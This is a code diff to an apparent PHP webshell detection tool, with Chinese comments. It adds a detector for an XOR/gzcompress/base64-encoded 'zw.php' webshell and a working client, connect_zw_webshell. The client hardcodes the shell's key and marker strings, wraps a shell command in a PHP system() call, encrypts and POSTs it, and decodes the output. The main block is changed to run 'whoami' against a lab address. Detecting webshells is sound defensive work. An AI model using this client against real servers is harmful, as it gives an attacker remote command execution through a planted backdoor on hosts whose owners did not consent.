@@ -2,6 +2,9 @@ import re
 from typing import Optional
 import sys
 import os
+import base64
+import requests
+import zlib
 
 sys.path.append(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
 
@@ -176,11 +179,67 @@ def detect_server_variable_trigger(content: str) -> Optional[ConnectionInfo]:
         )
     return None
 
+def detect_zw_php_webshell(content: str):
+    """
+    检测是否为 zw.php 类型的 XOR + gzcompress + base64 混合编码 WebShell。
+    返回 ConnectionInfo 对象或 None。
+    """
+    # 判断是否包含 zw.php 的关键结构
+    if all(keyword in content for keyword in [
+        'gzcompress', 'base64_encode', 'preg_match', 'file_get_contents("php://input"',
+        '$k=', '$kh=', '$kf='
+    ]):
+        key_match = re.search(r'\$k\s*=\s*[\'"]([0-9a-fA-F]{8})[\'"]', content)
+        kh_match = re.search(r'\$kh\s*=\s*[\'"]([0-9a-fA-F]+)[\'"]', content)
+        kf_match = re.search(r'\$kf\s*=\s*[\'"]([0-9a-fA-F]+)[\'"]', content)
+
+        if key_match and kh_match and kf_match:
+            return ConnectionInfo(
+                method='POST',
+                password=None,            # 无明确密码参数，使用原始 body
+                param_name=None,          # 无参数名，直接 base64 整体提交
+                encoding='xor+gz+base64', # 混合加密方式
+                test_command="echo 'test';"
+            )
+
+    return None
+
+def connect_zw_webshell(url, command):
+    key = b'50ec93c4'
+    kh = '895c0ccc987a'
+    kf = '0abca6138a3e'
+
+    def xor(data, key):
+        return bytes([b ^ key[i % len(key)] for i, b in enumerate(data)])
+
+    # 构造 payload
+    php_payload = f"echo '->'; system('{command}'); echo '<-';"
+    compressed = zlib.compress(php_payload.encode())
+    encrypted = xor(compressed, key)
+    b64_payload = base64.b64encode(encrypted).decode()
+    full_payload = kh + b64_payload + kf
+
+    # 发送请求
+    resp = requests.post(url, data=full_payload)
+    raw = resp.text
+
+    # 尝试提取加密响应体
+    try:
+        enc_result = raw.split(kh)[1].split(kf)[0]
+        decoded = base64.b64decode(enc_result)
+        decrypted = xor(decoded, key)
+        output = zlib.decompress(decrypted).decode()
+        if '->' in output and '<-' in output:
+            return output.split('->')[1].split('<-')[0].strip()
+        return output.strip()
+    except Exception as e:
+        return f"[!] Failed to parse result: {e}"
 
 if __name__ == "__main__":
-    content = """
-    $lang = (string)key($_GET);  // key返回数组的键名
-    $lang($_POST['cmd']); 
-    ?>
-    """
-    print(detect_get_key_and_post_func(content))
+    # content = """
+    # $lang = (string)key($_GET);  // key返回数组的键名
+    # $lang($_POST['cmd']); 
+    # ?>
+    # """
+    # print(detect_get_key_and_post_func(content))
+    print(connect_zw_webshell("http://172.25.0.2/zw.php", "whoami"))
